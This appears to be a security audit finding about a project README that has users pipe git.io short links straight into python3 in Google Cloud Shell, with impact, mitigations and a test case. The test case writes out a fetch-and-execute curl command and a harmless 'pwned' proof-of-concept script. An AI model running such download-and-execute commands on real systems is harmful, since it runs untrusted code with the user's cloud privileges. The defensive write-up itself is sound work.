### Vulnerability List

* Vulnerability Name: Git.io Short URL Compromise leading to Malicious Code Execution
* Description:
    1. The project distributes Python scripts via commands provided in the README.md file. These commands use `git.io` short URLs to fetch the scripts. For example: `python3 <(curl -s -S -L https://git.io/gwmme-create-service-account)`.
    2. A threat actor compromises the `git.io` short URL, for instance, by exploiting a vulnerability in the `git.io` service or by using social engineering to redirect the URL to a malicious destination.
    3. Instead of redirecting to the legitimate script on GitHub, the compromised `git.io` URL now redirects to a malicious Python script hosted by the attacker.
    4. A user, intending to use the provided scripts, follows the instructions in the README.md and copies and pastes the command into their Google Cloud Shell.
    5. The `curl -s -S -L https://git.io/gwmme-create-service-account` part of the command now fetches the malicious script from the attacker's server due to the compromised `git.io` URL. The `-L` flag in `curl` ensures following redirects, which is crucial for this attack.
    6. The `python3 <(...)` part of the command then executes the downloaded malicious script directly within the user's Cloud Shell environment.
* Impact:
    - Complete compromise of the user's Google Cloud environment.
    - Since the scripts are designed to create service accounts with administrative privileges, the Cloud Shell environment in which these scripts are executed likely has significant permissions.
    - A malicious script executed in this context could perform various harmful actions, including:
        - Data exfiltration from Google Cloud Storage, databases, or other services.
        - Data manipulation or deletion within the Google Cloud environment.
        - Resource hijacking or deletion (e.g., deleting VMs, networks).
        - Creation of persistent backdoors by creating new administrative users or service accounts under the attacker's control.
        - Further lateral movement within the user's Google Cloud infrastructure.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - None. The project relies on the security of the `git.io` URL shortening service, which is outside of the project's control.
    - The use of `curl -s -S -L` flags provides minimal security benefits in this context. `-s` (silent mode) and `-S` (show errors) are not security mitigations. `-L` (follow redirects) is actually necessary for the attack to work if `git.io` is compromised to redirect.
* Missing Mitigations:
    - **Remove reliance on `git.io` short URLs**: Replace the `git.io` short URLs in the README.md with direct, full URLs to the raw scripts on GitHub (e.g., `https://raw.githubusercontent.com/google/create-service-account/main/code/gwmme_create_service_account.py`). This eliminates the single point of failure introduced by the URL shortener.
    - **Implement integrity checks**: Provide checksums (like SHA256 hashes) of the scripts in the README.md. Users should be instructed to manually verify the checksum of the downloaded script before executing it. Alternatively, use digital signatures to sign the scripts and implement a verification step in the execution process, though this might add complexity for users in Cloud Shell.
    - **Display full URL to users**: Even with direct URLs, encourage users to review the URL and the script content before executing it, especially when running scripts with administrative privileges.
    - **Provide alternative installation methods**: Suggest alternative, more secure methods for users to obtain the scripts, such as cloning the entire repository and then running the scripts locally after manual review.
* Preconditions:
    - A threat actor must successfully compromise the `git.io` short URL used by the project.
    - A user must follow the instructions in the README.md and copy and paste the provided command, including the compromised `git.io` URL, into their Google Cloud Shell.
    - The user's Google Cloud Shell environment must have sufficient privileges for the malicious script to cause significant harm. Typically, Cloud Shell environments are configured with user's project-level or higher permissions.
* Source Code Analysis:
    - The vulnerability is not within the Python scripts themselves but in how they are distributed and how users are instructed to execute them.
    - The `README.md` file is the primary source of the vulnerability because it explicitly instructs users to use commands with `git.io` short URLs.
    - Examining the `README.md` file, we find the vulnerable commands under the "Usage" section:
        ```markdown
        ### Google Workspace Migration for Microsoft Exchange (GWMME)
        ```
        ```markdown
        python3 <(curl -s -S -L https://git.io/gwmme-create-service-account)
        ```
        ```markdown
        ### Google Workspace Migrate (GWM)
        ```
        ```markdown
        python3 <(curl -s -S -L https://git.io/gwm-create-service-account)
        ```
        ```markdown
        ### Password Sync
        ```
        ```markdown
        python3 <(curl -s -S -L https://git.io/password-sync-create-service-account)
        ```
    - These commands are directly copy-pastable by users into their Cloud Shell, making them highly susceptible to a `git.io` compromise attack.
    - The Python scripts themselves (`gwmme_create_service_account.py`, `gwm_create_service_account.py`, `password_sync_create_service_account.py`) are designed to perform privileged actions in Google Cloud, which amplifies the impact of the vulnerability if a malicious script is injected.

* Security Test Case:
    1. **Setup a malicious script and HTTP server:**
        - Create a file named `malicious_script.py` with the following content:
            ```python
            #!/usr/bin/python3
            print("Malicious script executed!")
            import os
            os.system("touch /tmp/pwned") # Create a file to indicate successful execution
            ```
        - Start a simple HTTP server serving this script. In a terminal, navigate to the directory containing `malicious_script.py` and run:
            ```bash
            python3 -m http.server 8000
            ```
            This starts a server on `http://localhost:8000`.

    2. **Simulate Git.io Compromise (Local Redirection):**
        - For testing, we will not actually compromise `git.io`. Instead, we will use `localhost` to simulate a compromised short URL.  In a real attack, the attacker would need to compromise the actual `git.io` redirection.
        - We will assume the original `git.io` URL for GWMME was `https://git.io/gwmme-create-service-account`. We will simulate its compromise by using `http://localhost:8000/malicious_script.py` as the malicious URL.

    3. **Prepare the malicious command:**
        - Construct the command that a user would copy, but replace the legitimate `git.io` URL with our malicious URL:
            ```bash
            python3 <(curl -s -S -L http://localhost:8000/malicious_script.py)
            ```

    4. **Execute in Google Cloud Shell:**
        - Open Google Cloud Shell in your Google Cloud project.
        - Copy and paste the malicious command prepared in the previous step into the Cloud Shell prompt and press Enter.

    5. **Verify Malicious Code Execution:**
        - Observe the output in the Cloud Shell. You should see the message "Malicious script executed!".
        - Check if the file `/tmp/pwned` has been created in the Cloud Shell environment by running `ls /tmp/pwned`. If the file exists, it confirms that the malicious script was successfully executed.

    6. **Cleanup:**
        - Stop the HTTP server (if running in the background, find its process ID and terminate it).
        - Remove the `/tmp/pwned` file from Cloud Shell using `rm /tmp/pwned`.

This test case successfully demonstrates that if the `git.io` URL were compromised, a malicious script could be injected and executed within a user's Google Cloud Shell environment by following the project's instructions. This confirms the vulnerability.
